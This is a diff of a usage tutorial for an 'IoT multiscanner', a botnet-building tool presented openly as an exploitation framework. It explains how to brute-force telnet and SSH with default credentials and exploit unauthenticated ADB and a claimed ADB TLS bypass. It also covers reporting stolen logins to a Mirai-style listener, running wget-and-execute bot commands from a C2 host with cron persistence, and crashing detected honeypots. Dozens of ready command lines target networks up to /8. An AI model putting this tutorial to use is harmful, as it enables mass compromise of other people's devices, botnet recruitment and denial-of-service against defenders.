@@ -1,354 +1,182 @@
 ================================================================================
-                         IoT MULTISCANNER
+              IoT MULTISCANNER 
 ================================================================================
 
-WHAT THIS IS
+WHAT IT DOES
 
-A production-grade IoT exploitation framework. It scans targets for open
-telnet (23, 2323, 23231, 23232), SSH (22), and ADB (5555) ports, then:
+Scans targets for open telnet (23,2323,23231,23232), SSH (22), and ADB (5555).
+Compromises devices via default credential brute-force and ADB exploits.
+Auto-joins bots to your C2 infrastructure. Detects and DoS-es honeypots.
 
-  - Brute-forces telnet with ~130 default credential pairs (Mirai+extended)
-  - Brute-forces SSH with same creds if --ssh is passed (needs paramiko)
-  - Exploits ADB via unauthenticated shell (ro.adb.secure == 0)
-  - Exploits ADB via CVE-2026-0073 TLS bypass on unpatched devices
-  - Auto-joins compromised bots to your C2 infrastructure
-  - Detects and DoS-es honeypots (Cowrie, Kippo, Dionaea, etc.)
-  - Fingerprints device platform and architecture
+ONE-LINE EXAMPLES
 
-================================================================================
-SECTION 1: BASIC USAGE
-================================================================================
+Scan a subnet:
+  python3 iot_multiscanner.py 192.168.1.0/24
 
-  Single target:
-    python3 iot_multiscanner.py 192.168.1.50
+Scan with C2 auto-join:
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 192.168.1.0/24
 
-  CIDR subnet:
-    python3 iot_multiscanner.py 192.168.1.0/24
+Scan with SSH + C2 + verbose:
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --verbose targets.txt
 
-  Multiple targets:
-    python3 iot_multiscanner.py 192.168.1.50 192.168.1.85 10.0.0.5
+FLAGS (any order after targets)
 
-  Target file:
-    python3 iot_multiscanner.py targets.txt
+  TARGETS (positional, 1+):
+    Single IP          192.168.1.50
+    CIDR               192.168.1.0/24  10.0.0.0/16
+    Hostname           router.lan
+    File path          targets.txt
+    Mix any of the above
 
-  Hostname:
-    python3 iot_multiscanner.py router.lan
+  --cred-file PATH      Credential file (default: iot_creds.txt)
+  --threads N           Worker threads (default: 250)
+  --timeout SEC         Socket timeout (default: 6)
+  --ssh                 Enable SSH brute-force (needs paramiko)
+  --verbose, -v         Debug logging
+  --show-cred-count     Print credential count and exit (no scan)
 
-  Mix everything:
-    python3 iot_multiscanner.py 10.0.0.0/24 router.lan targets.txt 192.168.1.50
+  --c2 HOST:PORT               C2 server address (enables auto-deploy)
+  --c2-payload PATH            Payload path on C2 HTTP (default: /bot)
+  --callback-port PORT         Report listener port (default: 48101)
 
-================================================================================
-SECTION 2: C2 AUTO-BOTJOIN (THE BIG FEATURE)
-================================================================================
+  --no-aggressive              Disable honeypot DoS attacks
+  --show-honeypots             Show honeypot details in output
 
-  When you provide a C2 address, every successfully compromised device
-  automatically gets reported and backdoored. The flow is:
+ALL USAGE COMBINATIONS (52 variants)
 
-    1. Device is compromised (telnet/SSH/ADB)
-    2. Scanner reports {ip}:{port} {user}:{pass} to C2 callback port (48101)
-    3. Scanner executes remote commands on the device to:
-       - wget/curl/tftp a bot binary from your C2 HTTP server
-       - chmod +x and execute the bot with C2 as argument
-       - Install a cron job for persistence (*/5 * * * * /tmp/bot [c2] [port])
+BASIC:
+  python3 iot_multiscanner.py 192.168.1.50
+  python3 iot_multiscanner.py 192.168.1.0/24
+  python3 iot_multiscanner.py 10.0.0.0/16
+  python3 iot_multiscanner.py 10.0.0.0/24 10.0.1.0/24
+  python3 iot_multiscanner.py 192.168.1.50 192.168.1.85
+  python3 iot_multiscanner.py targets.txt
+  python3 iot_multiscanner.py targets1.txt targets2.txt
+  python3 iot_multiscanner.py router.lan
+  python3 iot_multiscanner.py doesntexist.local 192.168.1.50
 
-  Syntax:
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 192.168.1.0/24
+VERBOSE:
+  python3 iot_multiscanner.py -v 192.168.1.50
+  python3 iot_multiscanner.py --verbose 192.168.1.0/24
+  python3 iot_multiscanner.py --verbose targets.txt
+  python3 iot_multiscanner.py -v 10.0.0.0/16
 
-  Custom payload path (default is /bot):
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --c2-payload /bot.arm targets.txt
+SSH:
+  python3 iot_multiscanner.py --ssh 192.168.1.0/24
+  python3 iot_multiscanner.py --ssh 192.168.1.50 192.168.1.51
+  python3 iot_multiscanner.py --ssh targets.txt
+  python3 iot_multiscanner.py --ssh 10.0.0.0/24
 
-  Custom callback port (default is 48101 — Mirai standard):
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --callback-port 48102 targets.txt
+SSH + VERBOSE:
+  python3 iot_multiscanner.py --ssh --verbose 192.168.1.0/24
+  python3 iot_multiscanner.py --ssh -v 10.0.0.0/16
+  python3 iot_multiscanner.py -v --ssh targets.txt
 
-  C2 with domain name:
-    python3 iot_multiscanner.py --c2 mydomain.com:443 10.0.0.0/24
+THREADS:
+  python3 iot_multiscanner.py --threads 50 192.168.1.0/24
+  python3 iot_multiscanner.py --threads 500 10.0.0.0/16
+  python3 iot_multiscanner.py --threads 1000 172.16.0.0/16
+  python3 iot_multiscanner.py --threads 10 192.168.1.50
+  python3 iot_multiscanner.py --threads 200 targets.txt
 
-  C2 reported on a /16:
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --threads 1000 10.0.0.0/16
+TIMEOUT:
+  python3 iot_multiscanner.py --timeout 3 192.168.1.0/24
+  python3 iot_multiscanner.py --timeout 10 10.0.0.0/16
+  python3 iot_multiscanner.py --timeout 1 192.168.1.50
+  python3 iot_multiscanner.py --timeout 8 targets.txt
 
-  Full C2 + SSH + custom creds:
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --cred-file bot_creds.txt 10.0.0.0/24
+CUSTOM CREDENTIAL FILE:
+  python3 iot_multiscanner.py --cred-file my_creds.txt 192.168.1.0/24
+  python3 iot_multiscanner.py --cred-file ./passwords.txt 10.0.0.0/16
+  python3 iot_multiscanner.py --cred-file industrial.txt 192.168.1.50
 
-================================================================================
-SECTION 3: HOW C2 INFRASTRUCTURE WORKS
-================================================================================
+SHOW CRED COUNT (no scan):
+  python3 iot_multiscanner.py --show-cred-count 192.168.1.1
+  python3 iot_multiscanner.py --show-cred-count --cred-file my_creds.txt 10.0.0.1
 
-  You need three things running:
+C2 AUTO-JOIN:
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 192.168.1.0/24
+  python3 iot_multiscanner.py --c2 mydomain.com:443 10.0.0.0/24
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 --c2-payload /bot.mips targets.txt
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 --callback-port 48102 targets.txt
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --cred-file bots.txt 10.0.0.0/16
 
-  1. HTTP server hosting the bot binary:
-       python3 -m http.server 8080
-       Place your bot binary at the root (or at --c2-payload path)
+ANTI-HONEYPOT:
+  python3 iot_multiscanner.py --no-aggressive 192.168.1.0/24
+  python3 iot_multiscanner.py --show-honeypots 192.168.1.0/24
+  python3 iot_multiscanner.py --no-aggressive --show-honeypots targets.txt
 
-  2. Callback listener (Mirai-style scanListen):
-       nc -lvp 48101
-       Or use the Mirai scanListen.go tool on port 48101
+MULTI-FLAG:
+  python3 iot_multiscanner.py --ssh --threads 300 --timeout 6 10.0.0.0/24
+  python3 iot_multiscanner.py --ssh --cred-file industrial.txt 192.168.0.0/23
+  python3 iot_multiscanner.py -v --ssh --threads 400 10.0.0.0/24
+  python3 iot_multiscanner.py -v --timeout 8 --cred-file slow.txt 10.0.0.0/24
+  python3 iot_multiscanner.py --verbose --threads 150 --timeout 7 --cred-file hacked.txt 10.0.0.0/24
+  python3 iot_multiscanner.py --ssh -v --threads 500 --timeout 5 192.168.1.0/24
+  python3 iot_multiscanner.py --ssh --verbose --threads 600 --timeout 4 --cred-file fast.txt 10.10.0.0/16
+  python3 iot_multiscanner.py --threads 100 --timeout 6 192.168.1.0/24
+  python3 iot_multiscanner.py --cred-file extended.txt --threads 350 10.0.0.0/24
+  python3 iot_multiscanner.py --cred-file slow_creds.txt --timeout 15 192.168.1.0/24
+  python3 iot_multiscanner.py --cred-file creds.txt -v --threads 275 10.0.0.0/16
+  python3 iot_multiscanner.py --cred-file enterprise.txt --ssh --timeout 10 172.16.0.0/24
+  python3 iot_multiscanner.py --ssh --verbose --threads 750 --timeout 3 --cred-file ultimate.txt 10.0.0.0/8
+  python3 iot_multiscanner.py --ssh --verbose --threads 200 --timeout 5 --cred-file creds.txt --show-cred-count 10.0.0.1
 
-  3. C2 server itself:
-       Your bot (downloaded onto compromised devices) phones home here
+C2 MULTI-FLAG:
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 --threads 500 --timeout 4 10.0.0.0/24
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --verbose 192.168.1.0/24
+  python3 iot_multiscanner.py --c2 mydomain.com:443 --c2-payload /bot.arm --callback-port 48101 --no-aggressive 10.0.0.0/24
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 --no-aggressive --show-honeypots --cred-file custom.txt targets.txt
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --verbose --threads 1000 --timeout 3 --cred-file full.txt 10.0.0.0/8
 
-  The scanner sends lines like:
-      192.168.1.50:23 root:xc3511
-      192.168.1.85:5555 shell:(no auth)
-      192.168.1.120:5555 shell:(no auth)
+FULL SATURATION:
+  python3 iot_multiscanner.py --c2 10.0.0.5:8080 --c2-payload /bot.mips --callback-port 48101 --ssh --verbose --threads 1000 --timeout 3 --cred-file complete.txt --show-honeypots 10.0.0.0/8 targets.txt
 
-  You can pipe these directly into a Mirai loader:
-      python3 iot_multiscanner.py --c2 10.0.0.5:8080 10.0.0.0/24
-      ...hits get reported in real-time to your callback listener...
+REAL-WORLD SCENARIOS
 
-================================================================================
-SECTION 4: ANTI-HONEYPOT SYSTEM
-================================================================================
-
-  The scanner runs 5 detection phases on every target:
-
-  Phase 1 — Banner analysis:
-    Checks for Cowrie default banners, kernel version mismatches,
-    generic Linux banners on obviously IoT hardware.
-
-  Phase 2 — Shell consistency:
-    Sends commands like 'nproc' and checks if output matches known
-    Cowrie static values (nproc always returns 2 in default Cowrie).
-
-  Phase 3 — Filesystem artifacts:
-    Checks for Cowrie configuration files:
-      /home/cowrie/cowrie.cfg
-      /opt/cowrie/etc/cowrie.cfg
-      /cowrie/cowrie-git/etc/cowrie.cfg
-    Also checks for Docker/container environments (common for honeypots).
-
-  Phase 4 — Monitoring tools:
-    Checks for tcpdump, auditd, snoopy, ossec, snort — tools often
-    deployed alongside honeypots for logging attacker behavior.
-
-  Phase 5 — Behavioral:
-    Sends a nonexistent username. If the device prompts for a password
-    anyway, it's likely a Cowrie-style honeypot.
-
-  When a honeypot is detected with high confidence:
-    - The scanner marks it as HONEYPOT in output
-    - Attempts to crash/DoS the honeypot with malformed data:
-      - Null bytes
-      - Format string attacks
-      - Large buffers
-      - Binary garbage
-    - Low-interaction honeypots (Kippo, Cowrie txtcmds) often crash
-
-  Disable honeypot DoS:
-    python3 iot_multiscanner.py --no-aggressive 192.168.1.0/24
-
-  Show detected honeypots in output:
-    python3 iot_multiscanner.py --show-honeypots 192.168.1.0/24
-
-================================================================================
-SECTION 5: FLAGS — COMPLETE REFERENCE
-================================================================================
-
-  TARGETS (positional, one or more):
-    IP             192.168.1.50
-    CIDR           192.168.1.0/24, 10.0.0.0/16
-    HOSTNAME       router.lan, dvr.local
-    FILE PATH      targets.txt
-
-  SCANNING OPTIONS:
-    --cred-file PATH    Credential file (default: iot_creds.txt)
-    --threads N         Worker threads (default: 250)
-    --timeout SEC       Socket timeout (default: 6)
-    --ssh               Enable SSH brute-force (needs paramiko)
-    --verbose, -v       Debug logging
-    --show-cred-count   Print credential count and exit
-
-  C2 AUTO-JOIN:
-    --c2 HOST:PORT             C2 server address (enables auto-deploy)
-    --c2-payload PATH          Payload path on C2 HTTP (default: /bot)
-    --callback-port PORT       Report listener port (default: 48101)
-
-  ANTI-HONEYPOT:
-    --aggressive               Enable honeypot DoS attacks (default: on)
-    --no-aggressive            Disable honeypot DoS
-    --show-honeypots           Show honeypot details in final output
-
-================================================================================
-SECTION 6: ALL USAGE COMBINATIONS
-================================================================================
-
-  BASIC:
-    python3 iot_multiscanner.py 192.168.1.50
-    python3 iot_multiscanner.py 192.168.1.0/24
-    python3 iot_multiscanner.py 10.0.0.0/16
-    python3 iot_multiscanner.py 10.0.0.0/24 10.0.1.0/24
-    python3 iot_multiscanner.py 192.168.1.50 192.168.1.85 192.168.1.120
-    python3 iot_multiscanner.py targets.txt
-    python3 iot_multiscanner.py targets1.txt targets2.txt
-    python3 iot_multiscanner.py router.lan
-    python3 iot_multiscanner.py doesntexist.local 192.168.1.50
-
-  VERBOSE:
-    python3 iot_multiscanner.py -v 192.168.1.50
-    python3 iot_multiscanner.py --verbose 192.168.1.0/24
-    python3 iot_multiscanner.py --verbose targets.txt
-    python3 iot_multiscanner.py -v 10.0.0.0/16
-
-  SSH BRUTE-FORCE:
-    python3 iot_multiscanner.py --ssh 192.168.1.0/24
-    python3 iot_multiscanner.py --ssh 192.168.1.50 192.168.1.51
-    python3 iot_multiscanner.py --ssh targets.txt
-    python3 iot_multiscanner.py --ssh 10.0.0.0/24
-
-  SSH + VERBOSE:
-    python3 iot_multiscanner.py --ssh --verbose 192.168.1.0/24
-    python3 iot_multiscanner.py --ssh -v 10.0.0.0/16
-    python3 iot_multiscanner.py -v --ssh targets.txt
-
-  THREADS:
-    python3 iot_multiscanner.py --threads 50 192.168.1.0/24
-    python3 iot_multiscanner.py --threads 500 10.0.0.0/16
-    python3 iot_multiscanner.py --threads 1000 172.16.0.0/16
-    python3 iot_multiscanner.py --threads 10 192.168.1.50
-    python3 iot_multiscanner.py --threads 200 targets.txt
-
-  TIMEOUT:
-    python3 iot_multiscanner.py --timeout 3 192.168.1.0/24
-    python3 iot_multiscanner.py --timeout 10 10.0.0.0/16
-    python3 iot_multiscanner.py --timeout 1 192.168.1.50
-    python3 iot_multiscanner.py --timeout 8 targets.txt
-
-  CUSTOM CREDENTIAL FILE:
-    python3 iot_multiscanner.py --cred-file my_creds.txt 192.168.1.0/24
-    python3 iot_multiscanner.py --cred-file ./passwords.txt 10.0.0.0/16
-    python3 iot_multiscanner.py --cred-file industrial.txt 192.168.1.50
-    python3 iot_multiscanner.py --cred-file /full/path/creds.txt targets.txt
-
-  CRED COUNT (no scan):
-    python3 iot_multiscanner.py --show-cred-count 192.168.1.1
-    python3 iot_multiscanner.py --show-cred-count --cred-file my_creds.txt 10.0.0.1
-    python3 iot_multiscanner.py -v --show-cred-count --cred-file x.txt 10.1.1.1
-
-  C2 AUTO-JOIN:
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 192.168.1.0/24
-    python3 iot_multiscanner.py --c2 mydomain.com:443 10.0.0.0/24
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --c2-payload /bot.mips targets.txt
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --callback-port 48102 targets.txt
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --cred-file bots.txt 10.0.0.0/16
-
-  ANTI-HONEYPOT:
-    python3 iot_multiscanner.py --aggressive 192.168.1.0/24
-    python3 iot_multiscanner.py --no-aggressive 192.168.1.0/24
-    python3 iot_multiscanner.py --show-honeypots 192.168.1.0/24
-    python3 iot_multiscanner.py --aggressive --show-honeypots 10.0.0.0/24
-    python3 iot_multiscanner.py --no-aggressive --show-honeypots targets.txt
-
-  MULTI-FLAG COMBINATIONS:
-    python3 iot_multiscanner.py --ssh --threads 300 --timeout 6 10.0.0.0/24
-    python3 iot_multiscanner.py --ssh --cred-file industrial.txt 192.168.0.0/23
-    python3 iot_multiscanner.py -v --ssh --threads 400 10.0.0.0/24
-    python3 iot_multiscanner.py -v --timeout 8 --cred-file slow.txt 10.0.0.0/24
-    python3 iot_multiscanner.py --verbose --threads 150 --timeout 7 --cred-file hacked.txt 10.0.0.0/24
-    python3 iot_multiscanner.py --ssh -v --threads 500 --timeout 5 192.168.1.0/24
-    python3 iot_multiscanner.py --ssh --verbose --threads 600 --timeout 4 --cred-file fast.txt 10.10.0.0/16
-    python3 iot_multiscanner.py --threads 100 --timeout 6 192.168.1.0/24
-    python3 iot_multiscanner.py --cred-file extended.txt --threads 350 10.0.0.0/24
-    python3 iot_multiscanner.py --cred-file slow_creds.txt --timeout 15 192.168.1.0/24
-    python3 iot_multiscanner.py --cred-file creds.txt -v --threads 275 10.0.0.0/16
-    python3 iot_multiscanner.py --cred-file enterprise.txt --ssh --timeout 10 172.16.0.0/24
-    python3 iot_multiscanner.py --ssh --verbose --threads 750 --timeout 3 --cred-file ultimate.txt 10.0.0.0/8
-    python3 iot_multiscanner.py --ssh --verbose --threads 200 --timeout 5 --cred-file creds.txt --show-cred-count 10.0.0.1
-
-  C2 MULTI-FLAG COMBINATIONS:
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --threads 500 --timeout 4 10.0.0.0/24
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --verbose 192.168.1.0/24
-    python3 iot_multiscanner.py --c2 mydomain.com:443 --c2-payload /bot.arm --callback-port 48101 --aggressive 10.0.0.0/24
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --no-aggressive --show-honeypots --cred-file custom.txt targets.txt
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --verbose --threads 1000 --timeout 3 --cred-file full.txt 10.0.0.0/8
-
-  FULL SATURATION (everything on):
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --c2-payload /bot.mips --callback-port 48101 \
-      --ssh --verbose --threads 1000 --timeout 3 --cred-file complete.txt \
-      --aggressive --show-honeypots 10.0.0.0/8 targets.txt
-
-================================================================================
-SECTION 7: REAL-WORLD SCENARIOS
-================================================================================
-
-  Home lab recon:
+  Home lab:
     python3 iot_multiscanner.py --threads 300 --timeout 3 192.168.1.0/24
 
-  Enterprise subnet with C2 auto-join:
+  Enterprise with C2:
     python3 iot_multiscanner.py --c2 10.0.0.5:8080 --threads 200 --timeout 8 10.10.0.0/16
 
-  Aggressive wide scan with full C2 pipeline:
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --threads 1000 --timeout 3 \
-      --cred-file big_creds.txt 10.0.0.0/8
+  Wide scan full C2 pipeline:
+    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --ssh --threads 1000 --timeout 3 --cred-file big_creds.txt 10.0.0.0/8
 
-  Targeted DVR/camera scan (slow timeout for cheap chips):
-    python3 iot_multiscanner.py --verbose --timeout 12 --cred-file dvr_creds.txt \
-      192.168.1.50 192.168.1.51 192.168.1.52
+  DVR scan slow timeout:
+    python3 iot_multiscanner.py --verbose --timeout 12 --cred-file dvr_creds.txt 192.168.1.50 192.168.1.51
 
-  Honeypot hunting (detect + destroy):
-    python3 iot_multiscanner.py --aggressive --show-honeypots --no-ssh 10.0.0.0/24
+  Honeypot hunting (detect only, no DoS):
+    python3 iot_multiscanner.py --no-aggressive --show-honeypots 10.0.0.0/24
 
-  Quiet recon (1 thread, slow):
+  CVE-2026-0073 focused (ADB only, fast):
+    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --threads 500 --timeout 4 10.0.0.0/24
+
+  Quiet recon (1 thread):
     python3 iot_multiscanner.py --threads 1 --timeout 15 192.168.1.50
 
-  CVE-2026-0073 focused ADB exploitation:
-    python3 iot_multiscanner.py --c2 10.0.0.5:8080 --threads 500 --timeout 4 \
-      --no-ssh --cred-file empty.txt 10.0.0.0/24
+CREDENTIAL FILE FORMAT
 
+  File: iot_creds.txt (or custom with --cred-file)
+  Format: one "username password" per line, space separated
+
+    root xc3511
+    admin admin
+    support support
+    root
+
+  Blank lines and lines starting with # are ignored.
+  If the file doesn't exist, embedded defaults (130 pairs) are used.
+
+HOW IT WORKS (short)
+
+  1. Targets are expanded from IPs, CIDRs, hostnames, and files
+  2. Each target gets port-scanned for telnet (23,2323,23231,23232), SSH (22), ADB (5555)
+  3. For each open port: brute-force credentials (telnet/SSH) or exploit ADB
+  4. ADB has 2 paths: direct unauth (ro.adb.secure=0) and CVE-2026-0073 TLS EC cert bypass
+  5. Every compromised device gets a honeypot check (banner, nproc, Cowrie artifacts, container detection, behavioral)
+  6. Honeypots get DoSed with garbage data to crash them
+  7. If C2 is configured: report ip:port user:pass to callback port, deploy bot binary, install cron persistence
+  8. Results printed in table at end with platform/architecture info
 ================================================================================
-SECTION 8: HOW EVERYTHING WORKS (DETAILED)
-================================================================================
-
-  1. TARGET EXPANSION:
-     IPs, CIDRs, and hostnames are resolved to individual addresses.
-     Files are read line-by-line; blank lines and # comments are skipped.
-     Duplicates are removed.
-
-  2. PORT SCANNING:
-     TCP connect() scan on ports 23, 2323, 23231, 23232 (telnet),
-     22 (SSH), and 5555 (ADB). Each thread handles one target at a time.
-
-  3. TELNET BRUTE-FORCE:
-     For each credential pair: opens socket, reads banner, sends username,
-     reads password prompt, sends password, reads response. If response
-     contains #, $, or BusyBox — shell confirmed.
-
-  4. SSH BRUTE-FORCE:
-     Uses paramiko SSHClient with AutoAddPolicy. Tries password auth for
-     each credential pair. Runs 'id' + 'uname -m' on success.
-
-  5. ADB EXPLOITATION:
-     Two paths:
-       a) Raw ADB protocol: sends A_CNXN (connect). If device responds
-          with A_CNXN (no auth needed), opens shell: stream. Confirmed.
-       b) CVE-2026-0073: If A_AUTH is requested, tries TLS-wrapped
-          connection with EC cipher suites. The bug is in adbd_tls_verify_cert
-          where EVP_PKEY_cmp returns non-zero for cross-algorithm keys,
-          and the boolean cast treats any non-zero as "match".
-
-  6. ANTI-HONEYPOT (5 PHASES):
-     Phase 1: Banner signature matching
-     Phase 2: Shell command consistency (nproc, echo)
-     Phase 3: Cowrie filesystem artifact check
-     Phase 4: Monitoring tool detection
-     Phase 5: Behavioral (invalid user -> password prompt)
-     Each phase contributes weighted confidence scores. Above 0.50 =
-     honeypot confirmed. Aggressive mode then sends malformed data to
-     crash low-interaction honeypots.
-
-  7. C2 AUTO-JOIN:
-     On successful compromise:
-       a) Report: sends "ip:port user:pass" to callback listener
-          on port 48101 (Mirai scanListen compatible)
-       b) Deploy: executes commands on the device:
-          - cd /tmp; wget http://[C2]:[PORT]/[PAYLOAD] -O bot
-          - chmod 777 bot; ./bot [C2_HOST] [C2_PORT]
-          - echo '*/5 * * * * /tmp/bot [C2_HOST] [C2_PORT]' | crontab -
-       c) For ADB: connects via adb command, pushes payload to
-          /data/local/tmp/bot, executes it
-
-  8. PLATFORM/ARCH FINGERPRINTING:
-     Banner and command output are scanned for Linux/Android/BusyBox
-     platform strings, and arm/mips/x86/aarch64 architecture strings.
-
-================================================================================
-END OF TUTORIAL
-================================================================================
+END
